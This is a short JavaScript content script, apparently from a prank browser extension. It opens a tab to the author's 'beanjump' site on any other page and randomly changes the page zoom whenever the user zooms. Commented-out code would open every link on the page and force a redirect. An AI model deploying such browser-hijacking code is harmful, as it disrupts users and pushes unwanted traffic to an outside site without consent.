let lastWidth = $(window).width();
let currentZoom = 100;
let timeUntilRedirect = Math.random()*5000 + 1000;
let timeAlive = 0;

// checks if it's already on a site i've made
function alreadyOn() {
    if (!window.location.href.includes('http://v-vv-vv.tech') && !window.location.href.includes('216.197.76.25')) {
        return false;
    }
    return true;
}

// opens a new bean jump tab
// and opens every link it finds
if (!alreadyOn()) {
    chrome.runtime.sendMessage({'message': 'open_new_tab', 'url': 'http://v-vv-vv.tech/beanjump'});
    // openLinks();
}

// zooms in or out randomly whenever the user zooms
function checkZoomed() {
    if (alreadyOn()) {
        return;
    }

    let currentWidth = $(window).width();

    if (currentWidth != lastWidth) {
        lastWidth = currentWidth;
        currentZoom += (Math.random() >= 0.5 ? 20 : -20);
        currentZoom = (currentZoom <= 0) ? 1 : currentZoom;
        $('body').css('zoom', ' ' + currentZoom + '%');
    }
    
    setTimeout(checkZoomed, 1000);
}

// opens all the links on the website
function openLinks() {
    let links = document.links;
    for (let i = 0; i < links.length; i++) {
        chrome.runtime.sendMessage({'message': 'open_new_tab', 'url': links[i].href});
    }
}

// after a randomized time, redirects to bean jump
function goToBeanJump() {
    if (!alreadyOn()) {
        window.location.href = 'http://v-vv-vv.tech/beanjump';
    }
}

// setTimeout(goToBeanJump, timeUntilRedirect);

checkZoomed();